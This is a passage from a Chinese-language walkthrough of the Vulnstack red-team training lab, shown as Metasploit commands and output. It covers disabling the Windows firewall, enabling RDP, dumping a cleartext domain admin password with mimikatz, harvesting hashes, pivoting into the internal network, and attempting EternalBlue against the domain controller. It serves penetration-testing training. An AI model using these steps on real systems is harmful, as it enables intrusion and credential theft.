                   krbtgt                   \nligang                   liukaifeng01             \nThe command completed successfully.\n</code></pre>\n</li>\n<li>\n<p>查看哪个是管理员用户，<code>Administrator</code> 就是域管理员</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net group <span class=\"hljs-string\">\"domain admins\"</span> /domain\nnet group <span class=\"hljs-string\">\"domain admins\"</span> /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.\n\nGroup name     Domain Admins\nComment        \n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            OWA$                     \nThe command completed successfully.\n\nC:\\phpStudy\\WWW>\n</code></pre>\n</li>\n</ol>\n<h2>获得靶机远程桌面</h2>\n<h3>开启靶机RPD</h3>\n<ol>\n<li>\n<p>靶机默认没有开启<code>3389</code>端口，同时还有防火墙</p>\n</li>\n<li>\n<p>首先关闭防火墙</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#关闭防火墙</span>\nnetsh firewall <span class=\"hljs-built_in\">set</span> opmode disable <span class=\"hljs-comment\">#winsows server 2003 之前</span>\nnetsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off <span class=\"hljs-comment\">#winsows server 2003 之后</span>\n</code></pre>\n</li>\n<li>\n<p>通过MSF启动RDP服务</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/manage/enable_rdp\n\n[*] Enabling Remote Desktop\n[*]     RDP <span class=\"hljs-keyword\">is</span> disabled; enabling it ...\n[*] Setting Terminal Services service startup mode\n[*]     The Terminal Services service <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span> to auto, changing it to auto ...\n[*]     Opening port <span class=\"hljs-keyword\">in</span> local firewall <span class=\"hljs-keyword\">if</span> necessary\n[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20241113014044_default_192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>_host.windows.cle_649955.txt\n</code></pre>\n</li>\n</ol>\n<h3>破解密码</h3>\n<ol>\n<li>\n<p>开启RDP服务后我们还需要密码才能登陆</p>\n</li>\n<li>\n<p>查看当前用户</p>\n<pre><code class=\"hljs language-python\">meterpreter > getuid\nServer username: GOD\\Administrator\n</code></pre>\n<p>域管理员用户</p>\n</li>\n<li>\n<p>在MSF使用<code>getsystem</code> 获得权限</p>\n<pre><code class=\"hljs language-python\">meterpreter > getsystem\n...got system via technique <span class=\"hljs-number\">1</span> (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<p>变成<code>NT AUTHORITY\\SYSTEM</code> 这是本地用户，是系统最高权限，因为我们需要破解密码</p>\n</li>\n<li>\n<p>使用MSF里的<code>mimikatz</code>模块</p>\n<p><code>mimikatz</code>模块的使用需要<code>Administrator</code>权限或者<code>System</code>权限，这就我们为什么需要<code>getsystem</code></p>\n<ul>\n<li>\n<p>加载<code>mimikatz</code> 模块</p>\n<pre><code class=\"hljs language-python\">meterpreter > load mimikatz\n[!] The <span class=\"hljs-string\">\"mimikatz\"</span> extension has been replaced by <span class=\"hljs-string\">\"kiwi\"</span>. Please use this <span class=\"hljs-keyword\">in</span> future.\nLoading extension kiwi...\n  .<span class=\"hljs-comment\">#####.   mimikatz 2.2.0 20191125 (x86/windows)</span>\n .<span class=\"hljs-comment\">## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)</span>\n <span class=\"hljs-comment\">## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>\n <span class=\"hljs-comment\">## \\ / ##       > http://blog.gentilkiwi.com/mimikatz</span>\n <span class=\"hljs-string\">'## v ##'</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  <span class=\"hljs-string\">'#####'</span>         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\n[!] Loaded x86 Kiwi on an x64 architecture.\n\nSuccess.\n</code></pre>\n</li>\n<li>\n<p>运行<code>creds_all</code> 命令</p>\n<pre><code class=\"hljs language-python\">meterpreter > creds_all                                                                                                                                                                                           \n[+] Running <span class=\"hljs-keyword\">as</span> SYSTEM                                                                                                                                                                                             \n[*] Retrieving <span class=\"hljs-built_in\">all</span> credentials                                                                                                                                                                                    \n..... 省略\nAdministrator  GOD.ORG      hongrisec@<span class=\"hljs-number\">2019</span>\nignoredjunk    ignoredjunk  ignoredjunk\nstu1$          GOD.ORG      d2 <span class=\"hljs-number\">64</span> a0 <span class=\"hljs-number\">33</span> a9 09 <span class=\"hljs-number\">93</span> <span class=\"hljs-number\">25</span> <span class=\"hljs-number\">30</span> cb 06 <span class=\"hljs-number\">36</span> c9 <span class=\"hljs-number\">74</span> fc <span class=\"hljs-number\">59</span> 3e 4f <span class=\"hljs-number\">49</span> 9a fc <span class=\"hljs-number\">20</span> 0a c3 f1 01 af <span class=\"hljs-number\">69</span> df <span class=\"hljs-number\">54</span> f4 <span class=\"hljs-number\">70</span> c0 fa 3e <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">95</span> <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">93</span> 9c <span class=\"hljs-number\">76</span> <span class=\"hljs-number\">39</span> 3c c1 ad f0 a3 4e <span class=\"hljs-number\">78</span> <span class=\"hljs-number\">61</span> b8 08 01 2d <span class=\"hljs-number\">42</span> c0 <span class=\"hljs-number\">82</span> <span class=\"hljs-number\">56</span> <span class=\"hljs-number\">66</span> <span class=\"hljs-number\">23</span>\n                            2e d1 07 da fd <span class=\"hljs-number\">12</span> b7 f6 <span class=\"hljs-number\">67</span> 8d <span class=\"hljs-number\">40</span> 4a d2 7f <span class=\"hljs-number\">47</span> 7c a5 b3 e5 7c 5d a0 0b <span class=\"hljs-number\">77</span> <span class=\"hljs-number\">45</span> c1 <span class=\"hljs-number\">92</span> <span class=\"hljs-number\">88</span> <span class=\"hljs-number\">38</span> de 6f <span class=\"hljs-number\">93</span> da b4 d1 c1 ec <span class=\"hljs-number\">20</span> da f7 <span class=\"hljs-number\">98</span> ac a8 05 <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">71</span> <span class=\"hljs-number\">85</span> <span class=\"hljs-number\">68</span> 0b <span class=\"hljs-number\">39</span> de c4 <span class=\"hljs-number\">42</span> db <span class=\"hljs-number\">21</span> 4a <span class=\"hljs-number\">83</span> ee ed ea\n                            9f <span class=\"hljs-number\">48</span> e0 <span class=\"hljs-number\">59</span> 1a <span class=\"hljs-number\">95</span> f2 e7 c2 d7 <span class=\"hljs-number\">89</span> 9e 06 ca 05 a0 4e <span class=\"hljs-number\">25</span> a4 06 07 d4 cd <span class=\"hljs-number\">27</span> db 8d b1 bd c0 <span class=\"hljs-number\">78</span> <span class=\"hljs-number\">39</span> <span class=\"hljs-number\">72</span> <span class=\"hljs-number\">79</span> <span class=\"hljs-number\">37</span> a0 <span class=\"hljs-number\">75</span> <span class=\"hljs-number\">98</span> ab 8f 1a <span class=\"hljs-number\">11</span> ce <span class=\"hljs-number\">56</span> dd <span class=\"hljs-number\">90</span> 06 <span class=\"hljs-number\">97</span> 8e 01 df <span class=\"hljs-number\">52</span> f4 bc 8c b3 ae c9 c2 <span class=\"hljs-number\">15</span> bb\n                            <span class=\"hljs-number\">96</span> fb <span class=\"hljs-number\">62</span> df 7a <span class=\"hljs-number\">48</span> <span class=\"hljs-number\">63</span> <span class=\"hljs-number\">24</span> dc fb 4c 3c 6d fd <span class=\"hljs-number\">35</span> <span class=\"hljs-number\">18</span> b0 <span class=\"hljs-number\">82</span> 4a ec a5 ee d1 de <span class=\"hljs-number\">46</span> <span class=\"hljs-number\">77</span> 2d 07 <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">31</span> <span class=\"hljs-number\">79</span> <span class=\"hljs-number\">69</span> d3 5c fa <span class=\"hljs-number\">62</span> <span class=\"hljs-number\">46</span> <span class=\"hljs-number\">62</span> <span class=\"hljs-number\">50</span> 3b 09 d0 d6 <span class=\"hljs-number\">94</span> b9 d2 <span class=\"hljs-number\">99</span> <span class=\"hljs-number\">58</span> 4b a5 <span class=\"hljs-number\">21</span> 5c 03 5b 01 fa <span class=\"hljs-number\">95</span> ca <span class=\"hljs-number\">90</span> 8d\n</code></pre>\n<p>得到密码<code>hongrisec@2019</code> ，也就是域管理员的密码</p>\n</li>\n</ul>\n</li>\n</ol>\n<h3>连接靶机RDP</h3>\n<ol>\n<li>\n<p>账户<code>god\\administrator</code> ,密码使用<code>hongrisec@2019</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image8.png\" alt=\"image.png\"></p>\n<p>连接成功，那么我们就拿下了边缘主机<code>win7</code>的远程桌面了</p>\n</li>\n<li>\n<p>我们尝试下通过网络访问域控主机，假如<code>administrator</code>是管理员账户就可以正常访问</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image9.png\" alt=\"image.png\"></p>\n<p>果然鹤猜想的一样，可以正常访问</p>\n</li>\n</ol>\n<h2>内网渗透</h2>\n<h3>继续内网信息收集，使用MSF的脚本</h3>\n<ul>\n<li>\n<p>查看靶机是否是虚拟机，是否处于蜜罐中</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/checkvm \n\n[*] Checking <span class=\"hljs-keyword\">if</span> the target <span class=\"hljs-keyword\">is</span> a Virtual Machine ...\n[+] This <span class=\"hljs-keyword\">is</span> a VMware Virtual Machine\n</code></pre>\n<p>因为我们现在是靶场环境，所以我们是出于虚拟机状态的</p>\n</li>\n<li>\n<p>查用用户信息，将密码离散值也弄出来了。密码离散值通过<code>hashdump</code>也可以获取</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/credentials/credential_collector \n\n[*] Running module against STU1\n[+] Collecting hashes...\n    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    Extracted: liukaifeng01:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n[+] Collecting tokens...\n    GOD\\Administrator\n    NT AUTHORITY\\SYSTEM\n    No tokens available\n</code></pre>\n</li>\n<li>\n<p>查看补丁信息</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/enum_patches \n[*] Running module against STU1 (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>)\nInstalled Patches\n=================\n  HotFix ID  Install Date\n  ---------  ------------\n  KB2534111  <span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">25</span>/<span class=\"hljs-number\">2019</span>\n  KB2999226  <span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">15</span>/<span class=\"hljs-number\">2019</span>\n  KB958488   <span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">29</span>/<span class=\"hljs-number\">2019</span>\n  KB976902   <span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">21</span>/<span class=\"hljs-number\">2010</span>\n</code></pre>\n</li>\n<li>\n<p>枚举靶机上安装的应用程序</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/enum_applications \n[*] Enumerating applications installed on STU1\nInstalled Applications\n======================\n Name                                                            Version\n ----                                                            -------\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> Redistributable (x86) - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>    <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span><span class=\"hljs-number\">.1</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> Redistributable (x86) - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>    <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span><span class=\"hljs-number\">.1</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Additional Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>   <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Additional Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>   <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Minimum Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>      <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Minimum Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>      <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> Redistributable (x86) - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>   <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span><span class=\"hljs-number\">.0</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> Redistributable (x86) - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>   <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span><span class=\"hljs-number\">.0</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Additional Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>  <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Additional Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>  <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Minimum Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>     <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Minimum Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>     <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Mozilla Firefox <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span> (x86 zh-CN)                              <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span>\n Mozilla Firefox <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span> (x86 zh-CN)                              <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span>\n Nmap <span class=\"hljs-number\">7.80</span>                                                       <span class=\"hljs-number\">7.80</span>\n Nmap <span class=\"hljs-number\">7.80</span>                                                       <span class=\"hljs-number\">7.80</span>\n Notepad++ (<span class=\"hljs-number\">32</span>-bit x86)                                          <span class=\"hljs-number\">7.7</span><span class=\"hljs-number\">.1</span>\n Notepad++ (<span class=\"hljs-number\">32</span>-bit x86)                                          <span class=\"hljs-number\">7.7</span><span class=\"hljs-number\">.1</span>\n Npcap <span class=\"hljs-number\">0.9983</span>                                                    <span class=\"hljs-number\">0.9983</span>\n Npcap <span class=\"hljs-number\">0.9983</span>                                                    <span class=\"hljs-number\">0.9983</span>\n WinPcap <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.3</span>                                                   <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2980</span>\n WinPcap <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.3</span>                                                   <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2980</span>\n Wireshark <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span> <span class=\"hljs-number\">32</span>-bit                                          <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span>\n Wireshark <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span> <span class=\"hljs-number\">32</span>-bit                                          <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span>\n</code></pre>\n</li>\n</ul>\n<h3>内网端口扫描</h3>\n<ol>\n<li>\n<p>把<code>win7</code>当跳板，则需要添加路由</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#添加一条路由</span>\nrun autoroute -s <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>  <span class=\"hljs-comment\"># 在kali上添加一条通向内网的路由</span>\n<span class=\"hljs-comment\">#查看路由添加情况</span>\nrun autoroute -p\n</code></pre>\n</li>\n<li>\n<p>然后将当前会话放入后台，存为<code>session 1</code> ，后面可以通过<code>sessions</code>命令指定<code>1</code>回到当前会话</p>\n<pre><code class=\"hljs language-python\">meterpreter > background\n[*] Backgrounding session <span class=\"hljs-number\">1.</span>.. \n</code></pre>\n</li>\n<li>\n<p>使用辅助模块里边的端口扫描，来扫描域里边的两台主机</p>\n<ul>\n<li>\n<p>首先扫描域成员的端口</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp \nmsf6 auxiliary(scanner/portscan/tcp) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(scanner/portscan/tcp) > <span class=\"hljs-built_in\">set</span> ports <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">500</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">3306</span>\nmsf6 auxiliary(scanner/portscan/tcp) > run\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">21</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">135</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">139</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - TCP OPEN\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>开启了<code>21</code>，<code>135</code>，<code>139</code>，<code>445</code></p>\n</li>\n<li>\n<p>扫描域控</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/portscan/tcp) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">135</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">80</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">139</span> - TCP OPEN\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:       - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>存在 <code>80</code>，<code>136</code>，<code>139</code>，<code>445</code></p>\n</li>\n<li>\n<p>竟然还存在<code>80</code>端口，我们可以通过之前获得的<code>RDP</code> 在<code>win7</code>里面访问，是默认页面</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image10.png\" alt=\"image.png\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3>尝试永恒之蓝</h3>\n<ol>\n<li>\n<p>两台机子都存在<code>445</code>端口，永恒之蓝漏洞肯定是要尝试的</p>\n</li>\n<li>\n<p>首先使用探测模块探测是否存在永恒之蓝<code>ms17-010</code></p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 auxiliary(scanner/smb/smb_ms17_010) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span> x86 (<span class=\"hljs-number\">32</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_ms17_010) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2008</span> R2 Datacenter <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span> x64 (<span class=\"hljs-number\">64</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>都是可能存在，不管如何都试试</p>\n</li>\n<li>\n<p>使用永恒之蓝攻击靶机</p>\n<p>ps：payload需要指定为正向连接，因为是在内网环境，靶机没有通向攻击机的路由</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter/bind_tc\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 <span class=\"hljs-keyword\">as</span> check\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2008</span> R2 Datacenter <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span> x64 (<span class=\"hljs-number\">64</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - The target <span class=\"hljs-keyword\">is</span> vulnerable.\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - Connecting to target <span class=\"hljs-keyword\">for</span> exploitation.\n[-] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span> - SMB Negotiation Failure -- this often occurs when lsass crashes.  The target may reboot <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">60</span> seconds.\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">4444</span>\n[*] Exploit completed, but no session was created.\n</code></pre>\n<p>失败，域控没有拿到shell</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(windows/smb/ms17_010_eternalblue) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 <span class=\"hljs-keyword\">as</span> check\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Host <span class=\"hljs-keyword\">is</span> likely VULNERABLE to MS17-<span class=\"hljs-number\">0</span>10! - Windows Server <span class=\"hljs-number\">2003</span> <span class=\"hljs-number\">3790</span> x86 (<span class=\"hljs-number\">32</span>-bit)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span>    - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - The target <span class=\"hljs-keyword\">is</span> vulnerable.\n[-] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - Exploit aborted due to failure: no-target: This module only supports x64 (<span class=\"hljs-number\">64</span>-bit) targets\n[*] Exploit completed, but no session was 